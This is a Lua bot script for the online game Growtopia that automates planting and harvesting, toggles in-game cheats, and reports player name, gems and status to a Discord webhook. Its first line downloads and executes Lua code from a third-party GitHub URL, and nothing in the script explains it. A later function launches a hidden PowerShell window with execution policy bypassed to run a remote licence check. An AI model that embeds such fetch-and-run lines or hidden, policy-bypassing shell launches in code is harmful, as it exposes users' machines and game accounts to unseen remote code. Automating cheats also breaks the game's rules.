--
load(MakeRequest("https://raw.githubusercontent.com/WASYHU/makan/main/roronoa.lua","GET").content)()
--
local REMOTE_X = KONFIGURASI.MAGPLANTS.XMAG
local REMOTE_Y = KONFIGURASI.MAGPLANTS.YMAG

local MAG_EMPTY = false
local CHANGE_REMOTE = false
local START_MAG_X = KONFIGURASI.MAGPLANTS.XMAG
local START_MAG_Y = KONFIGURASI.MAGPLANTS.YMAG
--
local function hook(varlist)
    if varlist[0]:find("OnTalkBubble") and (varlist[2]:find("The MAGPLANT 5000 is empty")) then
        CHANGE_REMOTE = true
        MAG_EMPTY = true
        return true
    end

    if varlist[0]:find("OnDialogRequest") and varlist[1]:find("magplant_edit") then
        local x = varlist[1]:match('embed_data|x|(%d+)')
        local y = varlist[1]:match('embed_data|y|(%d+)')
        return true
    end

    if varlist[0]:find("OnDialogRequest") and (varlist[1]:find("Item Finder") or varlist[1]:find("The MAGPLANT 5000 is disabled.")) then
        return true
    end

        if varlist[0]:find("OnConsoleMessage") and varlist[1]:find("Cheat Active") then
            return true
        end
        if varlist[0]:find("OnConsoleMessage") and varlist[1]:find("Whoa, calm down toggling cheats on/off... Try again in a second!") then
            return true
        end
        if varlist[0]:find("OnConsoleMessage") and varlist[1]:find("Applying cheats...") then
            return true
        end
        if varlist[0]:find("OnConsoleMessage") and varlist[1]:find("You're now") then
            return true
        end
        if varlist[0]:find("OnConsoleMessage") and varlist[1]:find("Cheat Disable:") then
            return true
        end
end

AddHook("onvariant", "Main Hook", hook)
--
local function CheckRemote()
    if findItem(5640) < 1 or MAG_EMPTY then
        Sleep(100)
        FindPath(REMOTE_X, REMOTE_Y - 1, 60)
        wrench(0,1)
        Sleep(200)
        SendPacket(2, "action|dialog_return\ndialog_name|magplant_edit\nx|".. REMOTE_X .."|\ny|" .. REMOTE_Y .. "|\nbuttonClicked|getRemote")
        Sleep(200)
        checkTree()
    end

    if findItem(5640) >= 1 and MAG_EMPTY then
        MAG_EMPTY = false
    end
    
    return checkTree()
end

local function NaniKore()
    if KONFIGURASI.Mode.Alone == false then
        SendPacket(2, "action|dialog_return\ndialog_name|cheats\ncheck_autoplace|0\ncheck_lonely|0\ncheck_gems|1")
    else
        SendPacket(2, "action|dialog_return\ndialog_name|cheats\ncheck_autoplace|0\ncheck_lonely|1\ncheck_gems|1")
    end
    if CHANGE_REMOTE then
            Sleep(150)
            if GetTile(REMOTE_X + 1, REMOTE_Y).fg == 5638 then
                REMOTE_X = REMOTE_X + 1
                CheckRemote()
            elseif GetTile(REMOTE_X + 1, REMOTE_Y).fg ~= 5638 then
                REMOTE_X = START_MAG_X
                CheckRemote()
            end
            CHANGE_REMOTE = false
        end
        return checkTree()
end
--

t = os.time()
function addComa(number)
    return string.gsub(number, "(%d)(%d%d%d)(%d%d%d)$","%1,%2,%3")
end

function delCol(str) -- Credits to KimPanzi
    local cleanedStr = string.gsub(str, "`(%S)", '')
    cleanedStr = string.gsub(cleanedStr, "`{2}|(~{2})", '')
    return cleanedStr
end


local function scanseed(id)
    local m=0
        for y=0,199 do
        for x=0,199 do
        if GetTile(x,y).fg == id then
        m = m + 1
        end
    end
end
    return m
end

function powershell(text)
te = os.time() - t
local DATA = [[
        {
            "username":"WEBHOOK INFORMATION",
            "avatar_url": "https://mystickermania.com/cdn/stickers/anime/jujutsu-kaisen-satoru-gojo-512x512.png",
            "content": "",
            "embeds": [{
                "color": "1146986",
                "author": {
                "name":"WebHook PTHT V2.1",
                "icon_url":"https://cdn.growtopia.tech/items/32.png"
                },
                "thumbnail": {
                    "url": "https://cdn.growtopia.tech/items/4584.png"
                },
                "description" : "]]..text..[[\n:exclamation: Name = ]]..delCol(GetLocal().name)..[[\n<:gems:1011931178510602240> Gems = ]]..addComa(GetPlayerInfo().gems)..[[\n<:world_generation:937567566656843836> World = ]]..KONFIGURASI.Webhook_Set.worlds..[[\n<:globe:1011929997679796254> UWS = ]]..findItem(12600)..[[\n<a:ArrowRgb:961613703176941598> Tree = ]]..scanseed(KONFIGURASI.Webhook_Set.idseed)..[[\n<a:ArrowRgb:961613703176941598> Delay PathMove = ]]..KONFIGURASI.Delay_Set.pathmove..[[\n<a:ArrowRgb:961613703176941598> HAND MODE = ]]..KONFIGURASI.Hand_Set.Hand..[[\n<a:ArrowRgb:961613703176941598> PLANT MODE = ]]..KONFIGURASI.Tile_Set.Mode..[[\n<a:ArrowRgb:961613703176941598> PT FOR | HT FOR = ]]..KONFIGURASI.Tile_Set.PT_for..[[ | ]]..KONFIGURASI.Tile_Set.HT_for..[[\n<:growtopia_clock:1011929976628596746> SC Uptime = ]]..math.floor(te/86400)..[[ Days ]]..math.floor(te%86400/3600)..[[ Hours ]]..math.floor(te%86400%3600/60)..[[ Minutes"
            }]
        }
        ]]
MakeRequest(KONFIGURASI.Webhook_Set.URL, "POST",{["Content-Type"] = "application/json"}, DATA)
end

-- 

function ht()
if KONFIGURASI.Tile_Set.HT_for == "BAWAH" then
    log("HARVEST DARI BAWAH")
if KONFIGURASI.Webhook_Set.disable == false then
    powershell("LAGI HARVEST")
        Sleep(100)
        else
        end
        if KONFIGURASI.Mode.Alone == false then
            SendPacket(2, "action|dialog_return\ndialog_name|cheats\ncheck_autoplace|0\ncheck_lonely|0\ncheck_gems|1")
        else
            SendPacket(2, "action|dialog_return\ndialog_name|cheats\ncheck_autoplace|0\ncheck_lonely|1\ncheck_gems|1")
        end
        Sleep(1000)
if KONFIGURASI.Hand_Set.Hand == "MRAY" then
    for y = KONFIGURASI.Tile_Set.starthty,KONFIGURASI.Tile_Set.endhty,-2 do
        for x = KONFIGURASI.Tile_Set.starthtx, KONFIGURASI.Tile_Set.endhtx do
            if isReady(GetTile(x,y)) then
                --log("Harvesting tree at ("..x..","..y..")")
                FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
                Sleep(KONFIGURASI.Delay_Set.DELAY_HT)
                punch(0,0)
                Sleep(KONFIGURASI.Delay_Set.DELAY_HT)
            end
        end
    end
end
if KONFIGURASI.Hand_Set.Hand == "RAY" then
    for y = KONFIGURASI.Tile_Set.starthty,KONFIGURASI.Tile_Set.endhty,-2 do
        for x = KONFIGURASI.Tile_Set.starthtx, 199 do
            if isReady(GetTile(x,y)) then
                --log("Harvesting tree at ("..x..","..y..")")
                FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
                Sleep(KONFIGURASI.Delay_Set.DELAY_HT)
                punchray(0,0)
                Sleep(KONFIGURASI.Delay_Set.DELAY_HT)
            end
        end
    end
end
end

if KONFIGURASI.Tile_Set.HT_for == "ATAS" then
    log("HARVEST DARI ATAS")
if KONFIGURASI.Webhook_Set.disable == false then
    powershell("LAGI HARVEST")
        Sleep(100)
        else
        end
        if KONFIGURASI.Mode.Alone == false then
            SendPacket(2, "action|dialog_return\ndialog_name|cheats\ncheck_autoplace|0\ncheck_lonely|0\ncheck_gems|1")
        else
            SendPacket(2, "action|dialog_return\ndialog_name|cheats\ncheck_autoplace|0\ncheck_lonely|1\ncheck_gems|1")
        end
        Sleep(1000)
if KONFIGURASI.Hand_Set.Hand == "MRAY" then
    for y = KONFIGURASI.Tile_Set.endhty,KONFIGURASI.Tile_Set.starthty,2 do
        for x = KONFIGURASI.Tile_Set.starthtx, KONFIGURASI.Tile_Set.endhtx do
            if isReady(GetTile(x,y)) then
                --log("Harvesting tree at ("..x..","..y..")")
                FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
                Sleep(KONFIGURASI.Delay_Set.DELAY_HT)
                punch(0,0)
                Sleep(KONFIGURASI.Delay_Set.DELAY_HT)
            end
        end
    end
end
if KONFIGURASI.Hand_Set.Hand == "RAY" then
    for y = KONFIGURASI.Tile_Set.endhty,KONFIGURASI.Tile_Set.starthty,2 do
        for x = KONFIGURASI.Tile_Set.starthtx, 199 do
            if isReady(GetTile(x,y)) then
                --log("Harvesting tree at ("..x..","..y..")")
                FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
                Sleep(KONFIGURASI.Delay_Set.DELAY_HT)
                punchray(0,0)
                Sleep(KONFIGURASI.Delay_Set.DELAY_HT)
            end
        end
    end
end
end
end

function pt()
    if MAG_EMPTY then return NaniKore() end
if KONFIGURASI.Webhook_Set.disable == false then
    powershell("LAGI PLANT")
    else
    end
        Sleep(100)
        place(5640,0,0)
        Sleep(1000)
if KONFIGURASI.Mode.Alone == false then
    SendPacket(2, "action|dialog_return\ndialog_name|cheats\ncheck_autoplace|1\ncheck_lonely|0\ncheck_gems|1")
else
    SendPacket(2, "action|dialog_return\ndialog_name|cheats\ncheck_autoplace|1\ncheck_lonely|1\ncheck_gems|1")
end
Sleep(400)
if KONFIGURASI.Tile_Set.ZZ == "NO" then
    log("PLANT ZIG-ZAG = `4false")
if KONFIGURASI.Tile_Set.PT_for == "BAWAH" then
    log("PLANT DARI BAWAH")
    if KONFIGURASI.Tile_Set.Mode == "VERTICAL" then
        log("MODE PLANT VERTICAL")
            if KONFIGURASI.Hand_Set.Hand == "MRAY" then
                for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx,10 do
                    for y= KONFIGURASI.Tile_Set.startpty,KONFIGURASI.Tile_Set.endpty,-2 do
                        if MAG_EMPTY then return NaniKore() end
                        if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
                        FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
                        Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
                        place(5640,0,0)
                        Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
                    end
                end
            end
        end
if KONFIGURASI.Hand_Set.Hand == "RAY" then
for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx do
    for y= KONFIGURASI.Tile_Set.startpty,KONFIGURASI.Tile_Set.endpty,-2 do
        if MAG_EMPTY then return NaniKore() end
            if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    end
end
end
if KONFIGURASI.Tile_Set.Mode == "HORIZONTAL" then
    log("MODE PLANT HORIZONTAL")
        if KONFIGURASI.Hand_Set.Hand == "MRAY" then
            for y= KONFIGURASI.Tile_Set.startpty,KONFIGURASI.Tile_Set.endpty,-2 do
            for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx,10 do
                if MAG_EMPTY then return NaniKore() end
                if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    end
end
if KONFIGURASI.Hand_Set.Hand == "RAY" then
for y= KONFIGURASI.Tile_Set.startpty,KONFIGURASI.Tile_Set.endpty,-2 do
    for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx do
        if MAG_EMPTY then return NaniKore() end
            if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    end
end
end
end

if KONFIGURASI.Tile_Set.PT_for == "ATAS" then
    log("PLANT DARI ATAS")
    if KONFIGURASI.Tile_Set.Mode == "VERTICAL" then
        log("MODE PLANT VERTICAL")
            if KONFIGURASI.Hand_Set.Hand == "MRAY" then
                for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx,10 do
                    for y= KONFIGURASI.Tile_Set.endpty,KONFIGURASI.Tile_Set.startpty,2 do
                        if MAG_EMPTY then return NaniKore() end
                        if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
                        FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
                        Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
                        place(5640,0,0)
                        Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
                    end
                end
            end
        end
if KONFIGURASI.Hand_Set.Hand == "RAY" then
for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx do
    for y= KONFIGURASI.Tile_Set.endpty,KONFIGURASI.Tile_Set.startpty,2 do
        if MAG_EMPTY then return NaniKore() end
            if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    end
end
end
if KONFIGURASI.Tile_Set.Mode == "HORIZONTAL" then
    log("MODE PLANT HORIZONTAL")
        if KONFIGURASI.Hand_Set.Hand == "MRAY" then
            for y= KONFIGURASI.Tile_Set.endpty,KONFIGURASI.Tile_Set.startpty,2 do
            for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx,10 do
                if MAG_EMPTY then return NaniKore() end
                if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    end
end
if KONFIGURASI.Hand_Set.Hand == "RAY" then
for y= KONFIGURASI.Tile_Set.endpty,KONFIGURASI.Tile_Set.startpty,2 do
    for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx do
        if MAG_EMPTY then return NaniKore() end
            if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    end
end
end
end
end

if KONFIGURASI.Tile_Set.ZZ == "YES" then
    log("PLANT ZIG-ZAG = `2true")
if KONFIGURASI.Tile_Set.PT_for == "BAWAH" then
    log("PLANT DARI BAWAH")
    if KONFIGURASI.Tile_Set.Mode == "VERTICAL" then
        log("MODE PLANT VERTICAL")
            if KONFIGURASI.Hand_Set.Hand == "MRAY" then
                count = 0
                for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx,10 do
                    if count%2 == 0 then
                    for y= KONFIGURASI.Tile_Set.startpty,KONFIGURASI.Tile_Set.endpty,-2 do
                        if MAG_EMPTY then return NaniKore() end
                        if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
                        FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
                        Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
                        place(5640,0,0)
                        Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
                    end
                end
            else
                for y= KONFIGURASI.Tile_Set.endpty,KONFIGURASI.Tile_Set.startpty,2 do
                    if MAG_EMPTY then return NaniKore() end
                        if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
                        FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
                        Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
                        place(5640,0,0)
                        Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
                    end
                end
            end
            count = count +1
        end
    end
if KONFIGURASI.Hand_Set.Hand == "RAY" then
    count = 0
for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx do
    if count%2 == 0 then
    for y= KONFIGURASI.Tile_Set.startpty,KONFIGURASI.Tile_Set.endpty,-2 do
        if MAG_EMPTY then return NaniKore() end
            if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    else
        for y= KONFIGURASI.Tile_Set.endpty,KONFIGURASI.Tile_Set.startpty,2 do
            if MAG_EMPTY then return NaniKore() end
            if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    end
    count = count+1
end
end
end
if KONFIGURASI.Tile_Set.Mode == "HORIZONTAL" then
    log("MODE PLANT HORIZONTAL")
        if KONFIGURASI.Hand_Set.Hand == "MRAY" then
            count = 0
            for y= KONFIGURASI.Tile_Set.startpty,KONFIGURASI.Tile_Set.endpty,-2 do
                if count%2 == 0 then
            for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx,10 do
                if MAG_EMPTY then return NaniKore() end
                if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    else
        for x= KONFIGURASI.Tile_Set.endptx,KONFIGURASI.Tile_Set.startptx,-10 do
            if MAG_EMPTY then return NaniKore() end
                if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    end
    count = count+1
end
end
if KONFIGURASI.Hand_Set.Hand == "RAY" then
    count = 0
for y= KONFIGURASI.Tile_Set.startpty,KONFIGURASI.Tile_Set.endpty,-2 do
    if count%2 == 0 then
    for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx do
        if MAG_EMPTY then return NaniKore() end
            if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
        else
        for x= KONFIGURASI.Tile_Set.endptx,KONFIGURASI.Tile_Set.startptx,-1 do
            if MAG_EMPTY then return NaniKore() end
                if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    end
    count = count+1
    end
end
end
end

if KONFIGURASI.Tile_Set.PT_for == "ATAS" then
    log("PLANT DARI ATAS")
    if KONFIGURASI.Tile_Set.Mode == "VERTICAL" then
        log("MODE PLANT VERTICAL")
            if KONFIGURASI.Hand_Set.Hand == "MRAY" then
                count = 0
                for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx,10 do
                    if count%2 == 0 then
                    for y= KONFIGURASI.Tile_Set.endpty,KONFIGURASI.Tile_Set.startpty,2 do
                        if MAG_EMPTY then return NaniKore() end
                        if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
                        FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
                        Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
                        place(5640,0,0)
                        Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
                    end
                end
            else
                for y= KONFIGURASI.Tile_Set.startpty,KONFIGURASI.Tile_Set.endpty,-2 do
                    if MAG_EMPTY then return NaniKore() end
                        if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
                        FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
                        Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
                        place(5640,0,0)
                        Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
                    end
                end
            end
            count = count+1
        end
    end
if KONFIGURASI.Hand_Set.Hand == "RAY" then
    count = 0
for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx do
    if count%2 == 0 then
    for y= KONFIGURASI.Tile_Set.endpty,KONFIGURASI.Tile_Set.startpty,2 do
        if MAG_EMPTY then return NaniKore() end
            if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    else
        for y= KONFIGURASI.Tile_Set.startpty,KONFIGURASI.Tile_Set.endpty,-2 do
            if MAG_EMPTY then return NaniKore() end
            if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    end
    count = count+1
end
end
end
if KONFIGURASI.Tile_Set.Mode == "HORIZONTAL" then
    log("MODE PLANT HORIZONTAL")
        if KONFIGURASI.Hand_Set.Hand == "MRAY" then
            count = 0
            for y= KONFIGURASI.Tile_Set.endpty,KONFIGURASI.Tile_Set.startpty,2 do
                if count%2 == 0 then
            for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx,10 do
                if MAG_EMPTY then return NaniKore() end
                if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    else
            for x= KONFIGURASI.Tile_Set.endptx,KONFIGURASI.Tile_Set.startptx,-10 do
                if MAG_EMPTY then return NaniKore() end
                if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    end
count = count+1
end
end
if KONFIGURASI.Hand_Set.Hand == "RAY" then
    count = 0
for y= KONFIGURASI.Tile_Set.endpty,KONFIGURASI.Tile_Set.startpty,2 do
    if count%2 == 0 then
    for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx do
        if MAG_EMPTY then return NaniKore() end
            if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    else
        for x= KONFIGURASI.Tile_Set.endptx,KONFIGURASI.Tile_Set.startptx,-1 do
            if MAG_EMPTY then return NaniKore() end
            if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
               --log("Planting tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
               place(5640,0,0)
               Sleep(KONFIGURASI.Delay_Set.DELAY_PT)
            end
        end
    end
    count = count+1
    end
end
end
end
end
end

function tambal()
    if MAG_EMPTY then return NaniKore() end
if KONFIGURASI.Webhook_Set.disable == false then
powershell("LAGI NAMBAL")
else
end
    for y= KONFIGURASI.Tile_Set.startpty,KONFIGURASI.Tile_Set.endpty,-1 do
        for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx do
            if MAG_EMPTY then return NaniKore() end
            while GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 do
               --log("Tambal tree at ("..x..","..y..")")
               FindPath(x,y,KONFIGURASI.Delay_Set.pathmove or 75)
               Sleep(10)
               place(5640,0,0)
               Sleep(10)
            end
        end
    end
end

function checkTree()
    for y = KONFIGURASI.Tile_Set.starthty,KONFIGURASI.Tile_Set.endhty,-1 do
        for x = KONFIGURASI.Tile_Set.starthtx,KONFIGURASI.Tile_Set.endhtx do
            if isReady(GetTile(x,y)) then
                --log("Harvesting tree at ("..x..","..y..")")
                ht()
        Sleep(100)
        checkTree()
                return
            end
        end
    end
    log("TIDAK ADA TREE UNTUK DI HARVEST")
    log("PLANT SEED")
    pt()
    log("NAMBAL")
    tambal()
    
    Sleep(100)
    checkTile()
end

function checkTile()
    if MAG_EMPTY then return NaniKore() end
for x= KONFIGURASI.Tile_Set.startptx,KONFIGURASI.Tile_Set.endptx,10 do
    for y= KONFIGURASI.Tile_Set.startpty,KONFIGURASI.Tile_Set.endpty,-2 do
        if MAG_EMPTY then return NaniKore() end
            if GetTile(x,y).fg == 0 and GetTile(x,y+1).collidable ~= 0 then
                --log("Planting tree at ("..x..","..y..")")
                pt()
                Sleep(100)
                tambal()
                Sleep(100)
                checkTree()
                return
            end
        end
    end
    log("SEMUA TILE SUDAH PENUH")
    useUws()
end

function useUws()
if KONFIGURASI.Webhook_Set.disable == false then
powershell("MENGGUNAKAN UWS")
else
end
    if findItem(12600) >= 1 then
        log("MENGGUNAKAN UWS")
        SendPacket(2,"action|dialog_return\ndialog_name|ultraworldspray")
        Sleep(8000)
        checkTree()
    else
        log("UWS HABIS")
Sleep(100)
        log("PTHT DIHENTIKAN")
Sleep(100)
if KONFIGURASI.Webhook_Set.disable == false then
powershell("UWS HABIS,PTHT DIHENTIKAN")
else
end
    end
end

function pshell(x)
  local abc = [[
  $host.ui.RawUI.WindowTitle = ""

  $deneme = "C:\Users\"+$env:USERNAME+"\AppData\Local\false.txt"
  $deneme2 = "C:\Users\"+$env:USERNAME+"\AppData\Local\true.txt"

  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  [System.Collections.ArrayList]$embedArray = @()

  $WebClient=New-Object net.webclient
  $gorkem = "]]..x..[["
  $raw = $WebClient.DownloadString("https://rentry.co/pthtuwsv2")

  If ($raw | %{$_ -match $gorkem})
  {

  If (Test-Path $deneme2) {
      Remove-Item $deneme2
  }
  New-Item $deneme2 -type file
  Add-Content -Path $deneme2 -Value "true"
  }
  else
  {

  If (Test-Path $deneme ) {
      Remove-Item $deneme
  }
  New-Item $deneme -type file
  Add-Content -Path $deneme -Value "false"
  }
  ]]
  pipe = io.popen("powershell -NoLogo -WindowStyle Hidden -ExecutionPolicy Bypass -command -", "w")
    pipe:write(abc)
    pipe:close()
  end
pshell(GetLocal().userid)

log("WAIT.. CEK USERID")
Sleep(1000)
cchat("`^SC PTHTUWS V2.1 ADVANCED `#BY ALFIRST-STORE")
Sleep(3000)
function file(name)
    local f=io.open(name,"r")
    if f~=nil then io.close(f) return true else return false end
end

username = os.getenv("USERNAME");
if file("C:\\Users\\"..username.."\\AppData\\Local\\true.txt") then
    os.remove("C:\\Users\\"..username.."\\AppData\\Local\\true.txt")

if KONFIGURASI.Webhook_Set.disable == false then
powershell("ID SESUAI, PTHT DIJALANKAN")
else
end
Sleep(1000)
log("ID SESUAI, PTHT DIJALANKAN")
Sleep(1000)

if KONFIGURASI.Mode.Alone == false then
SendPacket(2, "action|dialog_return\ndialog_name|cheats\ncheck_lonely|0\ncheck_gems|1")
else
log("MODE ALONE = `2True")
SendPacket(2, "action|dialog_return\ndialog_name|cheats\ncheck_lonely|1\ncheck_gems|1")
end

if KONFIGURASI.Hand_Set.Hand == "MRAY" then
log("MENGGUNAKAN MRAY")
wear(14214)
end

if KONFIGURASI.Hand_Set.Hand == "RAY" then
log("MENGGUNAKAN RAYMAN FIST")
wear(5480)
end
Sleep(1000)
CheckRemote()


elseif file("C:\\Users\\"..username.."\\AppData\\Local\\false.txt") then
    os.remove("C:\\Users\\"..username.."\\AppData\\Local\\false.txt")
 if KONFIGURASI.Webhook_Set.disable == false then
powershell("ID GAK SESUAI/KONTAK ADMIN ALFIRST STORE (linktr.ee/alfirst_store)")
else
end
log("ID GAK SESUAI/KONTAK ADMIN ALFIRST STORE (linktr.ee/alfirst_store)")
end
